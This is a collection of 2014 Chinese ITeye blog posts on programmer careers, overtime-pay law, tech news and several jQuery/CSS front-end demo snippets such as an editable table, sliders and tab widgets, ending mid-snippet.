感恩程序员的5年前和5年后, 909012142.iteye.com.blog.2059496, Sun, 04 May 2014 09:01:05 +0800

这几天事情比较多，晚上失眠了一大早就起来写写博客。5年前是我走上创业的第一年，时间真是过得很快、5年一晃就过去了。
　　5年前：(24岁)
　　1：技术水平也不会比现在弱很多，有创业的激情，干劲十足。
　　2：没一点经商的理念。
　　3：没一点儿做产品的理念。
　　4：其实也没有一个真正能拿得出手的东西。
　　5：只顾干活写软件。
　　6：没有为人处事的理念，不懂得珍惜身边的同事。
　　5年后：(29岁)
　　1：技术水平略有提高，思路更加严格、整体更加清晰。
　　2：能干活与会经商是2回事情，干活的可以比喻为农民工，经商是属于经营管理。
　　3：安心做好自己的产品的，只有像可乐一样，只要能把一种产品彻底做好，也有前途，可以反复卖个NN次。
　　4：能做出一个真正能拿得出手的东西，才有希望能做出N个拿得出的东西，质变与量变是有本质的区别。
　　5：生活并不只是写程序、写程序并不是生活的全部。
　　6：人活着其实就需要靠身边的人，珍惜好身边的每个人才能才能让别人珍惜你，只有别人珍惜你了，你才容易成功，才容易有幸福。
　　学会珍惜身边的每个人没啥坏处，你会变得越来越快乐，越来越幸福，钱也会越来越多，事业也会变得越来越幸福。
已有 19 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
周六周日加班的工资怎么算？, 909012142.iteye.com.blog.2055634, Sat, 26 Apr 2014 16:06:39 +0800

周六周日加班的工资怎么算？根据我国《劳动法》的规定，休息日安排劳动者工作又不能安排补休的，支付不低于工资的百分之二百的工资报酬。详细内容，下面就由法律快车的编辑为您介绍。
　　周六周日加班的工资怎么算？
　　《劳动法》第四十四条规定，下列情形之一的，用人单位应当按照下列标准支付高于劳动者正常工作时间工资的工资报酬：
　　(一)安排劳动者延长工作时间的，支付不低于工资的百分之一百五十的工资报酬；
　　(二)休息日安排劳动者工作又不能安排补休的，支付不低于工资的百分之二百的工资报酬；
　　(三)法定休假日安排劳动者工作的，支付不低于工资的百分之三百的工资报酬。
　　劳动部《工资支付暂行规定》第十三条规定，用人单位在劳动者完成劳动定额或规定的工作任务后，根据实际需要安排劳动者在法定标准工作时间以外工作的，应按以下标准支付工资：
　　(一)用人单位依法安排劳动者在日法定标准工作时间以外延长工作时间的，按照不低于劳动合同规定的劳动者本人小时工资标准的150%支付劳动者工资；
　　(二)用人单位依法安排劳动者在休息日工作，而又不能安排补休的，按照不低于劳动合同规定的劳动者本人日或小时工资标准的200%支付劳动者工资。
　　(三)用人单位依法安排劳动者在法定休假节日工作的，按照不低于劳动合同规定的劳动者本人日或小时工资标准的300%支付劳动者工资。
    所以，如果周六周日加班，又不能安排补休的，应该获得不低于工资的百分之二百的工资报酬。
已有 6 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
北京市政府将4月29日定为“首都网络安全日”, 909012142.iteye.com.blog.2050207, Sun, 20 Apr 2014 22:03:56 +0800

    中新网北京4月16日电 (记者 于立霄)北京警方16日发布消息称，北京市政府正式批准将每年4月29日设为“首都网络安全日”，届时北京将开展丰富多彩的系列活动。
首届“首都网络安全日”以“网络安全同担，网络生活共享”为主题，倡导首都社会各界和网民共同提高网络安全意识、承担网络安全责任、维护网络秩序。
北京作为中国科技创新中心，云集了全国70%以上的大型门户网站。据统计数据显示，截止2013年底，北京备案网站数量多达90余万家，网民数量突破1600万人，上网普及率达75.8%，北京已经成为名副其实的“网络之都”。
随着互联网的快速发展，民众对网络的依赖程度越来越高，网络安全对现实社会的影响也日益凸显。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
新浪云平台欲启动新域名updn.cn开发者活动, 909012142.iteye.com.blog.2049185, Sat, 19 Apr 2014 13:04:06 +0800

新浪云平台自2014年4月20日开始，更换成新的域名www.updn.cn。原有使用域名sinaapp暂停服务。新浪云平台将升级新的服务器放置在北京石景山机房，更加方便广大开发者快速访问和代码部署。目前新浪开发者中心包含sae、MySQL、Storage、Memcache、Cron、Image、FetchURL、Mail、TaskQueue、DeferredJob、Counter、KVDB、CDNalpha、Channel等栏目，每天24小时不间断地提供在线服务。广大开发者能够从平台得到最有保障、最完善的网络服务。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
本女子突发奇想，珠宝首饰做通讯设备, 909012142.iteye.com.blog.2048171, Fri, 18 Apr 2014 10:18:29 +0800

珠宝首饰对于爱美的小女子而言，是每天必穿戴的，作为一个身处IT界的程序员，我突发奇想，是不是可以在珠宝首饰上做文章，变成可穿戴的设备，不知道大家觉得可行否？
iPhone为什么自发布之日其就如此火爆？就是因为在当时普通手机只是科技产品的时候，iPhone将科技和时尚巧妙地结合了起来，既开创了大屏智能手机的科技潮流，也让其成为时尚达人的最爱之物，引领了一股时尚浪潮。我想，可穿戴珠宝一样可以向世人展现了它的风采。
可穿戴珠宝既可以算是可穿戴设备的分支，也可以算是珠宝行业的一次自我进化。在其身上融入的科技与时尚元素，让其显得特立独行，引来无数人的关注目光。或许，在以后年轻人的婚礼上，传统的钻石戒指将被有着健康监测功能、手机通知功能的科技钻石戒指所取代……
可穿戴珠宝，花样繁多，市场潜力不同非凡！
已有 5 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
分享一个很酷的html5网站源码, 909012142.iteye.com.blog.2047886, Thu, 17 Apr 2014 15:24:55 +0800

截图：
 
演示地址
 
使用方法：
1、在head区域引入jquery-1.8.0.js和jquery.easing.js和jquery.scrollpath.js和index.js四个JS文件。
2、引入css文件，注意图片路径。
3、<!-- 代码 -->注释区区域即网站主体代码。
 
    本文附件下载:
    
      updn.rar (1.6 MB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
这份工作，我实在受不了了, 909012142.iteye.com.blog.2047088, Tue, 15 Apr 2014 21:57:30 +0800

先说说我的基本情况，高中时成绩不错，但因为个人原因没有参加高考，回家闲了几年，一直在家里的日杂店帮忙，后来读的是父母单位委培的成教大专，05年毕业，至今工作五年，其中实习两年（单位可恶啊），工作是java编程。
我所在的工作单位是国企，有四男两女，除我之外都是40岁左右，离退休只有几年时间。平时的工作就是守电话，等待故障报修，如果没有故障需要修理，平时就没有什么具体的工作。
我平时的工作就是，每六天一个夜班，平时正常上下午到单位，打扫下卫生，烧瓶水，喝喝茶，然后就是一个上午漫长的发呆等待下班，下午也是如此。实话说，我跟屋里那些同事也没有太多什么共同语言，上午男的都在炒股，我也不懂，也参与不进去，再说结婚的人和没结婚的关心的事情是有很多不一样的。再说，经过这么几年时间，对这份工作我的心真的累了，无奈了，也再也没有一丝一毫的幻想，有的只是一个空虚的人和无边的痛苦。今天下午我在单位，感到特别孤寂，想想怎么会走到今天这一步。五年的工作，没有让我拥有更多，朋友在工作中都有各自的一片天地，慢慢的关系渐渐疏远，事业（说事业这个词有些可笑）毫无发展和进步，人际关系停滞不前，接触不到人，个性也越来越沉闷和压抑。我真的是受不了了，眼看着年龄越来越大，学历又笛，真的不知道自己还能做些什么，不知道该怎么办啊
"蜜虫的虫虫 问“一直不跳槽，是什么原因”
原因是我的大专证书是委培的成人教育，出了这个单位大概是一点用没有。在一个我是女生，奔三应该说马上就到三十的年龄了，缺乏勇气了吧
已有 27 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
苹果97年的一项专利 已经预见未来, 909012142.iteye.com.blog.2046110, Tue, 15 Apr 2014 10:57:22 +0800

上月 Patently Apple 网站发表了一份题为“Facebook 20 亿美元收购 Oculus”的报告，其中指出，苹果收购微软 Kinect 技术提供商 PrimeSens 将加快苹果视频头戴设备开发进程。近期，美国专利商标局公布了苹果一项有关视频头戴设备应用专利。
　　根据专利描述，苹果视频头戴设备或将成为未来苹果 TV 补充配件，或者就是一款苹果 TV iDevice。
　　这项专利可以追溯到 1997 年，全称为“头戴显示屏”。根据专利描述，这款头戴设备可以充当用户的“个人电视机”，可以播放来自手机或者平板电脑上的电影和电视剧。
　　苹果在专利中描述道：“一款头戴眼镜式系统能够为用户提供个性化的媒体浏览体验。这款设备可能包含了一个外罩、配套的光学组件（用于生成媒体内容）和镜片（用于向用户展示媒体内容。”
　　为了让用户获得舒服的体验，这款系统可能还包括透气组件，包括一些透气泡沫，可以让用户调整显示屏生成组件与眼球的相对位置。此外，这款系统可能还包括一些数据处理电路，来调整光学组件生成的左、右图案，用来显示 3D 媒体。
　　巧合的是，上周 KGI 证劵分析师郭明池称，苹果在今年秋季将推出其电视机设备。如果苹果电视机辅助配件也能届时发布，将为整个产业带来不小的轰动。不过，目前还不清楚苹果是否还将致力于开发 iDevice 之类的设备或者配件。
　　不过，苹果如果能参与进来，将是非常好的机会来赶超 Oculus。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
IT人，身在北上广，你做到了这些么？, 909012142.iteye.com.blog.2045910, Mon, 14 Apr 2014 18:15:59 +0800

1、在北上广三地做IT，技术是基础，是硬性的指标，古语说得好：“在绝对的实力面前，所谓的技巧真的是不堪一击”。所以要想扎根做技术，“功夫”一定要过硬，否则永无出头之日。
2、关注业内动向 扑捉无线商机，不是那种花边新闻 而是实实在在的业界动向
3、参与到当地的社区和线下组织当中  争取和他们的发起者成为朋友 拓展自己在圈子内的人脉资源 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
jQuery实现可编辑表格, corangecn.iteye.com.blog.2064155, Fri, 09 May 2014 08:42:42 +0800
演示地址:http://www.corange.cn/demo/3833/index.html<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <head> <title>可以编辑的表格</title> <script type="text/javascript" src="../jquery.js"></script> </head> <body> <table border="1px"> <tr> <td>123123</td> <td>456456</td> </tr> </table> </body> </html><script>$(function(){ //找到所有的td节点 $("td").click(tdclick); }); function tdclick(){ var td = $(this); //1.取出当前的文本内容并且保存起来 var text = td.text(); //2. 清除当前的td内容 td.html("");//也可以用empty()方法 //3.建立一个input标签 var input = $("<input>"); //4.设置文本框里面的值是改写后的内容 input.attr("value",text); //4.5响应键盘事件，处理回车 input.keyup(function(event){ //1.判断是否回车按下 //结局不同浏览器获取时间的差异 var myEvent = event || window.event; var key = myEvent.keyCode; if(key == 13){ var inputNode = $(this); //1.保存当前文本框的内容 var inputText = inputNode.val(); //2.清空td里面的内容 inputNode.parent().html(inputText); td.click(tdclick); } }); input.blur(function(){ var inputNode = $(this); var inputText = inputNode.val(); inputNode.parent().html(inputText); td.click(tdclick); }); //5.把文本框就加入到td里面去 td.append(input); //6.需要清除td上面的点击事件 //6.5高亮数据 td.unbind("click"); //7.提取文本框里面的值 } </script> 原文地址:http://www.corange.cn/archives/2012/05/3833.html
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
select option项目带图片, corangecn.iteye.com.blog.2062543, Wed, 07 May 2014 10:35:42 +0800

演示地址:http://www.corange.cn/demo/3826/index.html<script type="text/javascript" src="http://code.jquery.com/jquery-latest.min.js"></script><script type="text/javascript" src="jquery.customselect.js"></script><title>Custom select boxes with icons</title><style type="text/css">#iconselect {background: url(select-bg.gif) no-repeat;height: 25px;width: 250px;font: 13px Arial, Helvetica, sans-serif;padding-left: 15px;padding-top: 4px;}.selectitems {width: 230px;height: 25px;border-bottom: dashed 1px #ddd;padding-left: 10px;padding-top: 2px;}.selectitems span {margin-left: 5px;}#iconselectholder {width: 250px;overflow: auto;display: none;position: absolute;background-color:#fff5ec;}.hoverclass{background-color: #fff;cursor: pointer;}.selectedclass{background-color: #ff9;}</style><script type="text/javascript">$(function(){$('#customselector').customSelect();});</script></head><body><select name="select" class="customselect" title="" id="customselector"><option value="icon1" title="images/attention.gif">Attention icon</option><option value="icon2" title="images/backward.gif">Back Icon</option><option value="icon3" title="images/base.gif">Base Icon</option></select></body></html> 原文地址:http://www.corange.cn/archives/2012/04/3826.html
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
jquery 滑动效果，在一个范围内来回滑动, corangecn.iteye.com.blog.2059523, Sun, 04 May 2014 10:32:30 +0800
IE7不支持演示地址:http://www.corange.cn/demo/3808/index.html <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" SYSTEM "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><meta http-equiv="Content-Type" content="text/html;charset=UTF-8"><head><link href="op/styleshe.css" rel="stylesheet" type="text/css"><script type="text/javascript" src="op/jquery00.js"></script><script type="text/javascript" src="op/easySlid.js"></script> <script type="text/javascript"> $(document).ready(function(){ $("#slider").easySlider();}); </script><div id="slidercontainer"> <div id="slider"> <ul> <li><a href=""><img src="../demo2.jpg" alt=""></a></li> <li><a href=""><img src="../demo3.jpg" alt=""></a></li> <li><a href=""><img src="../demo4.jpg" alt=""></a></li> <li><a href=""><img src="../demo5.jpg" alt=""></a></li><li><a href=""><img src="../demo6.jpg" alt=""></a></li> </ul> </div></div> 原文地址:http://www.corange.cn/archives/2012/03/3808.html
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
纯css下拉菜单，可以设置下拉菜单为多列, corangecn.iteye.com.blog.2056469, Tue, 29 Apr 2014 09:31:24 +0800

演示地址:http://www.corange.cn/demo/3806/index.html <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd"><HTML><HEAD><META http-equiv=Content-Type content=text/html;CHARSET=utf-8><LINK href="styles.css" type=text/css rel=stylesheet><DIV class=menu-bar><UL class=main-menu><LI class=topLevel style="WIDTH: 139px"><A href="engagement-rings-wedding/566/">BRIDAL GALLERY</A><DIV class=sub-menu><TABLE><TBODY><TR><TD vAlign=top><UL><LI class=sub-menu-li nowrap><A href="sc-engagement-rings_76/" nowrap>Engagement&nbsp;Rings</A> <LI class=sub-menu-li nowrap><A href="sc-wedding-sets_82/" nowrap>Wedding&nbsp;Sets</A> <LI class=sub-menu-li nowrap><A href="sc-multi-stone_261/" nowrap>Multi&nbsp;Stone&nbsp;Rings</A> <LI class=sub-menu-li nowrap><A href="sc-three-stone_137/" nowrap>Three&nbsp;Stone&nbsp;Rings</A> <LI class=sub-menu-li nowrap><A href="sc-solitaire_78/" nowrap>Solitaire&nbsp;Rings</A> <LI class=sub-menu-li nowrap><A href="sc-engagement-rings_76/sts-round_686/" nowrap>Round&nbsp;Diamonds</A> </LI></UL></TD><TD vAlign=top><UL><LI class=sub-menu-li nowrap><A href="sc-engagement-rings_76/sts-princess_687/" nowrap>Princess&nbsp;Diamonds</A> <LI class=sub-menu-li nowrap><A href="sc-engagement-rings_76/sts-marquise_689/" nowrap>Marquise&nbsp;Diamonds</A> <LI class=sub-menu-li nowrap><A href="wedding-rings/524/" nowrap>Wedding&nbsp;Bands</A> <LI class=sub-menu-li nowrap><A href="anniversary-jewelry/449/" nowrap>Anniversary&nbsp;Rings</A> <LI class=sub-menu-li nowrap><A href="sc-engagement-rings_76/so-bestsellers/" nowrap>Top&nbsp;Selling</A> <LI class=sub-menu-li nowrap><A href="sc-engagement-rings_76/so-ratings_i.avgRating%20DESC/" nowrap>Top&nbsp;Rated</A> </LI></UL></TD></TR></TBODY></TABLE></DIV></LI><LI class=topLevel style="WIDTH: 77px"><A href="rings/19/">RINGS</A><DIV class=sub-menu><TABLE><TBODY><TR><TD vAlign=top><UL><LI class=sub-menu-li nowrap><A href="c-rings_35/s-diamond_63/g-for-her_151+338/" nowrap>Diamond&nbsp;Rings</A> <LI class=sub-menu-li nowrap><A href="c-rings_35/s-gemstone_~63+~66+~452+~363+~58+~64+~483/" nowrap>Gemstone&nbsp;Rings</A> <LI class=sub-menu-li nowrap><A href="c-rings_35/sc-promise_84/" nowrap>Promise&nbsp;Rings</A> <LI class=sub-menu-li nowrap><A href="c-rings_35/sc-colored-diamonds_259/" nowrap>Colored&nbsp;Diamond&nbsp;Rings</A> <LI class=sub-menu-li nowrap><A href="sc-engagement-rings_76/" nowrap>Engagement&nbsp;Rings</A> <LI class=sub-menu-li nowrap><A href="sc-wedding-sets_82/" nowrap>Wedding&nbsp;Sets</A> </LI></UL></TD><TD vAlign=top><UL><LI class=sub-menu-li nowrap><A href="c-rings_35/sc-anniversary_138/" nowrap>Anniversary&nbsp;Rings</A> <LI class=sub-menu-li nowrap><A href="wedding-rings/524/" nowrap>Wedding&nbsp;Bands</A> <LI class=sub-menu-li nowrap><A href="c-rings_35/m-sterling-silver_211/" nowrap>Sterling&nbsp;Silver&nbsp;Rings</A> <LI class=sub-menu-li nowrap><A href="c-rings_35/so-bestsellers/" nowrap>Top&nbsp;Selling</A> <LI class=sub-menu-li nowrap><A href="c-rings_35/so-ratings_i.avgRating%20DESC/" nowrap>Top&nbsp;Rated</A> <LI class=sub-menu-li nowrap><A href="c-rings_35/so-newest_i.id%20DESC/" nowrap>Newest</A> </LI></UL></TD></TR></TBODY></TABLE></DIV></LI></UL></DIV></BODY></HTML> 原文地址:http://www.corange.cn/archives/2012/02/3806.html
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
图片切换 自动切换 带左右按钮与分页索引按钮控制图片, corangecn.iteye.com.blog.2053977, Thu, 24 Apr 2014 10:37:35 +0800
图片切换 自动切换显示隐藏showhide带左右按钮与分页索引按钮控制图片自动切换显示隐藏showhide演示地址:http://www.corange.cn/demo/3804/index.html <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>jquery 图片切换显示隐藏show/hide带左右按钮与分页索引按钮控制图片显示隐藏show/hide</title><style type="text/css">*{margin:0;padding:0;list-style-type:none;}a,img{border:0;}body{font:12px/180% Arial;}a{font-size:12px;color:#ff6600;text-decoration:none;}a:hover{color:#3366cc;}/* dlyL */.dlyL{width:690px;height:415px;position:relative;margin:20px auto;}.dlyL b{background:url(images/icons-arrow.gif) no-repeat;}.dlyL b{width:10px;height:15px;display:block;position:absolute;top:35px;cursor:pointer;}.dlyL b.prev{left:13px;top:110px;background-position:0 0;}.dlyL b.next{right:13px;top:110px;background-position:-9px 0;}.dlyL div{width:620px;height:340px;margin:0 auto 9px;overflow:hidden;border:solid 1px #ddd;}.dlyL span{display:block;text-align:center;}.dlyL span i{padding:2px 5px;background-color:#cbcbcb;color:#fff;margin:auto 1px;cursor:pointer;}.dlyL span i.current{background-color:#ef7000;}.dlyL h4{font-weight:normal;text-align:center;padding-top:8px;}</style></head><body><script type="text/javascript" src="../jquery.js"></script><script type="text/javascript">$(function(){var $index = 0;var $nav = $(".dlyL span i");var $text = $(".dlyL h4 a");var $pics = $(".dlyL div a");$(".dlyL span i").click(function(){ var $self = $(this);var $index = $nav.index($self);showMzin($index);$(".dlyL b.next").click(function(){if($index<3){/* 设置4个显示分页 */$index++}else if($index==3){ /* 设置4个显示分页 */$index=0}showMzin($index);});$(".dlyL b.prev").click(function(){if($index>0){$index--}else if($index==0){$index=3 /* 设置4个显示分页 */}showMzin($index);});}).eq(0).trigger("click");function showMzin(i){$pics.hide(),$pics.eq(i).show(),$text.hide(),$text.eq(i).show(),$nav.removeClass("current"),$nav.eq(i).addClass("current");}DLYTime =setInterval(function(){$(".dlyL b.next").trigger("click");}, 3000);$(".dlyL").mouseover(function(){if(DLYTime){clearInterval(DLYTime);}});$(".dlyL").mouseout(function(){DLYTime =setInterval(function(){$(".dlyL b.next").trigger("click");},3000);});});</script><div class="dlyL"><b class="prev"></b><b class="next"></b><div><a href=""><img width="620" height="340" alt="" src="../demo1.jpg" /></a><a href=""><img width="620" height="340" alt="" src="../demo2.jpg" /></a><a href=""><img width="620" height="340" alt="" src="../demo3.jpg" /></a><a href=""><img width="620" height="340" alt="" src="../demo4.jpg" /></a></div><span><i>1</i><i>2</i><i>3</i><i>4</i></span><h4><a href="http://www.corange.cn">www.corange.cn</a><a href="">j</a><a href="">2</a><a href="">3</a></h4></div><!--dlyL end--></body></html> 原文地址:http://www.corange.cn/archives/2011/12/3804.html
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
jquery tab选项卡，支持垂直选项卡滚动、水平选项卡滚动、自动选项卡切换, corangecn.iteye.com.blog.2046098, Tue, 15 Apr 2014 10:35:56 +0800
支持垂直选项卡滚动、水平选项卡滚动、自动选项卡切换图片就不上了，很多效果，直接看演示演示地址:http://www.corange.cn/demo/3803/index.html <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html;charset=utf-8" /><title>jquery tab选项卡，支持垂直选项卡滚动、水平选项卡滚动、自动选项卡切换-www.corange.cn</title><style type="text/css">*{margin:0px;padding:0px;list-style-type:none;}a{color:#35679a;text-decoration:none;}a:hover{color:#c00;text-decoration:underline;}a,img{border:none;}body{text-align:left;background:#505050;font-size:12px;font-family:Arial, Helvetica, sans-serif;}.cont{background:#080808;padding:8px;width:840px;margin:0 auto;}.main{background:#eee;padding:6px;}h2{font-size:16px;font-family:"黑体";color:#35679a;;padding:4px 10px;margin:10px 0 16px;font-weight:100;border-bottom:2px solid #ccc;}h3{padding-left:50px;font-size:16px;color:#555;}.testtab{border:4px solid #ccc;margin:10px 50px;}.tabtag{line-height:24px;height:24px;border-bottom:2px solid #ccc;}.tabtag li{float:left;width:24%;text-align:center;background:#eee;}.tabtag li.cur{color:#900;background:#fff;}.tabcon{height:100px;overflow:hidden;}.tabcon div{height:100px;color:#900;font-size:14px;}#tabcon2,#tabcon4{height:340px;overflow:hidden;}.tabcon li{line-height:25px;padding:0 0 0 10px;}pre{color:#444;}pre strong{font-weight:900;}</style><script type="text/javascript" src="../jquery.js"></script> <script type="text/javascript" src="js/tab.lib.js"></script><script type="text/javascript">$(document).ready(function(){/* 垂直滚动 点击触发 */$("#testtab").tab({tabId:"#tabtag",tabTag:"li",conId:"#tabcon",conTag:"div",act:"click",effact: "scrolly", dft:0});/* 水平滚动 点击触发 设置起始显示序列 */$("#testtab2").tab({tabId:"#tabtag2",tabTag:"li",conId:"#tabcon2",conTag:"div",act:"mouseover",effact: "scrollx",dft:0});/* 无效果 自动切换 */$("#testtab3").tab({tabId:"#tabtag3",tabTag:"li",conId:"#tabcon3",conTag:"div",auto:true,act:"mouseover"});/* slow 缓慢滚动效果 */$("#testtab4").tab({tabId:"#tabtag4",tabTag:"li",conId:"#tabcon4",conTag:"div",effact: "slow",act:"mouseover"});/* 选项卡切换 */$("#testtab5").tab({tabId:"#tabtag5",tabTag:"li",conId:"#tabcon5",conTag:"div",act:"mouseover"});});</script></head><body><div align="center"><a href="../../archives/2011/12/3803.html"><h2>jquery tab选项卡，支持垂直选项卡滚动、水平选项卡滚动、自动选项卡切换</h2></a></div><div class="cont"><div class="main"><h2>切换</h2> <h3>垂直滚动 点击触发</h3> <div class="testtab" id="testtab"><div id="tabtag" class="tabtag" style="position:relative;"><ul><li class="cur">jquery 特效</li><li>javascript 特效</li><li>css 特效</li><li>html5 特效</li></ul></div><div id="tabcon" class="tabcon"><div><ul> <li><a href="">jquery特效制作banner图片滚动播放、按钮控制图片滚动、选项卡等基于多功能jquery slide插件</a></li><li><a href="">jQuery特效插件:Tablesorter 2.0 表格用户体验内容筛选与分页筛选</a></li> <li><a href="">jquery特效插件Validform制作一行代码搞定整站的表单验证</a></li> <li><a href="">jquery特效制作 slide 图片窗帘式滚动</a></li> </ul> </div><div><ul> <li><a href="">javascript特效按钮控制图片左右自动滚动</a></li><li><a href="">javascript特效多功能选项卡自动切换内容图片延迟加载</a></li> <li><a href="">javascript特效图片滚动插件支持单排图片上下滚动、图片无缝滚动</a></li> <li><a href="">javascript特效网页banner制作焦点图片切换带按钮和固定图标控制图片左右滚动</a></li></ul></div><div><ul><li><a href="">纯CSS下拉菜单</a></li><li><a href="">CSS3的动画按钮泡泡</a></li><li><a href="">用CSS3更换一个确认对话框的jQuery</a></li><li><a href="">使用jQuery制作更好的selcet选择元素和CSS3</a></li> </ul></div><div><ul> <li><a href="">制作CSS3和HTML5的一个单页网站模板</a></li><li><a href="">一个HTML5的幻灯片基于jQuery框架</a></li> <li><a href="">旋转幻灯片使用jQuery和CSS3</a></li> </ul></div></div></div><pre>$("#testtab").tab({tabId:"#tabtag", //切换控制器的IDtabTag:"li", //切换控制器标签conId:"#tabcon", //内容容器IDconTag:"div", //容器标签act:"click", //点击触发 也可以不设置 默认就为click 设置为 mouseover则为划过effact: "scrolly" //效果为纵向滚动})</pre><h3>水平滚动 点击触发 设置起始显示序列</h3> <div class="testtab" id="testtab2"><div id="tabtag2" class="tabtag" style="position:relative;"><ul><li class="cur">jquery 特效</li><li>javascript 特效</li><li>css 特效</li><li>html5 特效</li></ul></div><div id="tabcon2"><div><a href=""><img width="620" height="340" alt="用jquery特效制作图片金字塔式放大缩小展示" src="../demo1.jpg" /></a></div><div><a href=""><img width="620" height="340" alt="javascript特效图片滚动插件支持单排图片上下滚动、图片无缝滚动" src="../demo2.jpg" /></a></div><div><a href=""><img width="620" height="340" alt="CSS3的动画按钮泡泡" src="../demo3.jpg" /></a></div><div><a href=""><img width="620" height="340" alt="旋转幻灯片使用jQuery和CSS3" src="../demo4.jpg" /></a></div></div></div><pre>$("#testtab2").tab({tabId:"#tabtag2", //切换控制器的IDtabTag:"li", //切换控制器标签conId:"#tabcon2", //内容容器IDconTag:"div", //容器标签act:"click", //点击触发 也可以不设置 默认就为click 设置为 mouseover则为划过effact: "scrollx", //横向滚动效果<strong>dft:2</strong> //设置起始显示序列})</pre><h3>无效果 自动切换</h3> <div class="testtab" id="testtab3"><div id="tabtag3" class="tabtag" style="position:relative;"><ul><li class="cur">jquery 特效</li><li>javascript 特效</li><li>css 特效</li><li>html5 特效</li></ul></div><div id="tabcon3" class="tabcon"><div><ul> <li><a href="">jquery特效制作banner图片滚动播放、按钮控制图片滚动、选项卡等基于多功能jquery slide插件</a></li><li><a href="">jQuery特效插件:Tablesorter 2.0 表格用户体验内容筛选与分页筛选</a></li> <li><a href="">jquery特效插件Validform制作一行代码搞定整站的表单验证</a></li> <li><a href="">jquery特效制作 slide 图片窗帘式滚动</a></li> </ul> </div><div><ul> <li><a href="">javascript特效按钮控制图片左右自动滚动</a></li><li><a href="">javascript特效多功能选项卡自动切换内容图片延迟加载</a></li> <li><a href="">javascript特效图片滚动插件支持单排图片上下滚动、图片无缝滚动</a></li> <li><a href="">javascript特效网页banner制作焦点图片切换带按钮和固定图标控制图片左右滚动</a></li></ul></div><div><ul><li><a href="">纯CSS下拉菜单</a></li><li><a href="">CSS3的动画按钮泡泡</a></li><li><a href="">用CSS3更换一个确认对话框的jQuery</a></li><li><a href="">使用jQuery制作更好的selcet选择元素和CSS3</a></li> </ul></div><div><ul> <li><a href="">制作CSS3和HTML5的一个单页网站模板</a></li><li><a href="">一个HTML5的幻灯片基于jQuery框架</a></li> <li><a href="">旋转幻灯片使用jQuery和CSS3</a></li> </ul></div></div></div><pre>$("#testtab3").tab({tabId:"#tabtag3",tabTag:"li",conId:"#tabcon3",conTag:"div",<strong>auto:true,</strong>act:"mouseover"}) </pre><h3>“slow” 缓慢滚动效果</h3> <div class="testtab" id="testtab4"><div id="tabtag4" class="tabtag" style="position:relative;"><ul><li class="cur">jquery 特效</li><li>javascript 特效</li><li>css 特效</li><li>html5 特效</li></ul></div><div id="tabcon4"><div><a href=""><img width="620" height="340" alt="用jquery特效制作图片金字塔式放大缩小展示" src="../demo1.jpg" /></a></div><div><a href=""><img width="620" height="340" alt="javascript特效图片滚动插件支持单排图片上下滚动、图片无缝滚动" src="../demo2.jpg" /></a></div><div><a href=""><img width="620" height="340" alt="CSS3的动画按钮泡泡" src="../demo3.jpg" /></a></div><div><a href=""><img width="620" height="340" alt="旋转幻灯片使用jQuery和CSS3" src="../demo4.jpg" /></a></div></div></div><pre>$("#testtab4").tab({tabId:"#tabtag4",tabTag:"li",conId:"#tabcon4",conTag:"div",<strong>effact: "slow"</strong>}) </pre><h3>普通选项卡</h3> <div class="testtab" id="testtab5"><div id="tabtag5" class="tabtag" style="position:relative;"><ul><li class="cur">jquery 特效</li><li>javascript 特效</li><li>css 特效</li><li>html5 特效</li></ul></div><div id="tabcon5" class="tabcon"><div><ul> <li><a href="">jquery特效制作banner图片滚动播放、按钮控制图片滚动、选项卡等基于多功能jquery slide插件</a></li><li><a href="">jQuery特效插件:Tablesorter 2.0 表格用户体验内容筛选与分页筛选</a></li> <li><a href="">jquery特效插件Validform制作一行代码搞定整站的表单验证</a></li> <li><a href="">jquery特效制作 slide 图片窗帘式滚动</a></li> </ul> </div><div><ul> <li><a href="">javascript特效按钮控制图片左右自动滚动</a></li><li><a href="">javascript特效多功能选项卡自动切换内容图片延迟加载</a></li> <li><a href="">javascript特效图片滚动插件支持单排图片上下滚动、图片无缝滚动</a></li> 